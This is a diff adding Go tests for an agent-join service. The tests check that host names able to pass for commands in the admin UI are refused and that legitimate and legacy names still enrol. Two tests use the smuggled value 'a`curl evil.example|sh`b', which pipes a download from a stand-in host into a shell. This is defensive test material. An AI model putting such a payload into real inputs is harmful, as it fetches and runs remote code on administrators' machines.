@@ -5,11 +5,13 @@ import (
 	"context"
 	"encoding/base64"
 	"encoding/json"
+	"errors"
 	"strings"
 	"testing"
 	"time"
 
 	"github.com/eyupio/zoomies/internal/agent"
+	"github.com/eyupio/zoomies/internal/auth"
 	"github.com/eyupio/zoomies/internal/backend"
 	"github.com/eyupio/zoomies/internal/store"
 )
@@ -1545,5 +1547,150 @@ func TestAnUpgradedAgentThatRenamesItselfReclaimsItsOwnRow(t *testing.T) {
 	thief.PreviousHostID = other.ID
 	if _, err := h.c.Join(h.ctx, thief, "10.0.0.66"); err == nil {
 		t.Error("a join claimed another host's row by naming its id, with no token to prove it")
+	}
+}
+
+// ---------------------------------------------------------------------------
+// Join: what a host may call itself
+// ---------------------------------------------------------------------------
+
+// A host's name is chosen by its agent and is then written into the problems
+// list, where the UI draws a backtick pair as a command with a copy button. A
+// join token only proves the agent was let in, not that what it says about
+// itself is safe to show an administrator, so the join refuses a name that
+// could pass for a command -- and does it before it redeems the token, so the
+// person who typed the name wrong keeps a token they can use.
+func TestJoinRefusesAHostNameThatCouldPassForACommand(t *testing.T) {
+	const hostile = "a`curl evil.example|sh`b"
+	for name, host := range map[string]string{
+		"a backtick pair around a command": hostile,
+		"a lone backtick":                  "build`box",
+		"a line break":                     "two\nlines",
+		"a control character":              "build\x1b[31mbox",
+		"a paragraph":                      strings.Repeat("a", 129),
+	} {
+		t.Run(name, func(t *testing.T) {
+			h := newHarness(t)
+			token := h.joinToken(t, nil, 0)
+
+			resp, err := h.c.Join(h.ctx, joinRequest(host, token), "10.0.0.9")
+			if err == nil {
+				t.Fatalf("a host named %q enrolled and got %+v", host, resp)
+			}
+			// The agent's operator can fix this, so it is a refusal with the
+			// reason, not a 500 with a request ID.
+			if !errors.Is(err, auth.ErrInvalidInput) {
+				t.Errorf("error = %v, want one the API answers with its reason", err)
+			}
+			// It says how to fix it, in the voice of the empty-name refusal,
+			// and does not repeat what it refuses.
+			for _, want := range []string{"--name", "agent.name"} {
+				if !strings.Contains(err.Error(), want) {
+					t.Errorf("the refusal should mention %q: %v", want, err)
+				}
+			}
+			if strings.Contains(err.Error(), "evil.example") {
+				t.Errorf("the refusal repeats the name it refuses: %v", err)
+			}
+			hosts, lerr := h.st.ListHosts(h.ctx)
+			if lerr != nil {
+				t.Fatalf("ListHosts: %v", lerr)
+			}
+			if len(hosts) != 0 {
+				t.Fatalf("a refused join left %d host row(s) behind", len(hosts))
+			}
+
+			// Nothing was redeemed: the same token enrols the same machine once
+			// it has a name that is allowed.
+			if _, err := h.c.Join(h.ctx, joinRequest("build-box", token), "10.0.0.9"); err != nil {
+				t.Fatalf("the token was spent by a refused join: %v", err)
+			}
+		})
+	}
+}
+
+// The names the fleet already uses must keep joining. A rule that refused one
+// would turn an upgrade into an outage for a machine that had worked for months.
+func TestJoinStillAcceptsEveryShapeOfNameAFleetUses(t *testing.T) {
+	for _, host := range []string{
+		"zoomies-16vcpu-32gb-ubuntu-2404-build01",
+		"ip-10-0-31-44.eu-west-1.compute.internal",
+		"7096d9a9b798",
+		"Build Box 1",
+		"büro-rechner",
+		strings.Repeat("a", 128),
+	} {
+		h := newHarness(t)
+		if _, err := h.c.Join(h.ctx, joinRequest(host, h.joinToken(t, nil, 0)), "10.0.0.9"); err != nil {
+			t.Errorf("join as %q: %v", host, err)
+		}
+	}
+}
+
+// A host enrolled before the rule existed is working now and must go on
+// working. Refusing its next join -- after a rebuild, say, or an agent
+// upgrade that dropped its credentials -- would take a machine out of the fleet
+// because of a name nobody asked it to change. Its name is shown neutralised
+// wherever a sentence uses it, and an operator can rename it when they choose.
+func TestAHostEnrolledUnderANowRefusedNameCanStillJoinAgain(t *testing.T) {
+	const legacy = "build`box"
+	h := newHarness(t)
+
+	plaintext, hash := auth.NewAgentToken()
+	old := &store.Host{
+		Name: legacy, Capacity: 2, Backends: store.StringSlice{"docker"}, Labels: store.StringMap{},
+		OS: "linux", Arch: "amd64", LastHeartbeat: time.Now(), TokenHash: hash,
+	}
+	if err := h.st.CreateHost(h.ctx, old); err != nil {
+		t.Fatalf("CreateHost: %v", err)
+	}
+
+	// The machine itself, which still holds the token it was issued.
+	req := joinRequest(legacy, h.joinToken(t, nil, 0))
+	req.PreviousToken = plaintext
+	resp, err := h.c.Join(h.ctx, req, "10.0.0.9")
+	if err != nil {
+		t.Fatalf("a host already enrolled under %q could not join again: %v", legacy, err)
+	}
+	if resp.HostID != old.ID {
+		t.Errorf("host ID = %s, want its own row (%s)", resp.HostID, old.ID)
+	}
+
+	// The embedded agent joins on every start, from the operator's own
+	// configuration, with no token to show. It is never refused for its name:
+	// a single-VM controller would have no host at all.
+	if _, err := h.c.EmbeddedTransport().Join(h.ctx, agent.JoinRequest{
+		ProtocolVersion: agent.ProtocolVersion, Name: "embedded`box", Capacity: 1,
+	}); err != nil {
+		t.Errorf("the embedded agent was refused its configured name: %v", err)
+	}
+}
+
+// The exemption is for the name a host already has and nothing else: a host
+// that is re-joining may not use the occasion to take a new name the rule
+// refuses.
+func TestAnEnrolledHostCannotJoinAgainUnderANewRefusedName(t *testing.T) {
+	h := newHarness(t)
+	plaintext, hash := auth.NewAgentToken()
+	old := &store.Host{
+		Name: "build-box", Capacity: 2, Backends: store.StringSlice{"docker"}, Labels: store.StringMap{},
+		OS: "linux", Arch: "amd64", LastHeartbeat: time.Now(), TokenHash: hash,
+	}
+	if err := h.st.CreateHost(h.ctx, old); err != nil {
+		t.Fatalf("CreateHost: %v", err)
+	}
+
+	req := joinRequest("a`curl evil.example|sh`b", h.joinToken(t, nil, 0))
+	req.PreviousHostID = old.ID
+	req.PreviousToken = plaintext
+	if resp, err := h.c.Join(h.ctx, req, "10.0.0.9"); err == nil {
+		t.Fatalf("a re-joining host took a refused name and got %+v", resp)
+	}
+	after, err := h.st.GetHost(h.ctx, old.ID)
+	if err != nil {
+		t.Fatalf("a refused join removed the host: %v", err)
+	}
+	if after.Name != "build-box" {
+		t.Errorf("name = %q after a refused join, want it untouched", after.Name)
 	}
 }
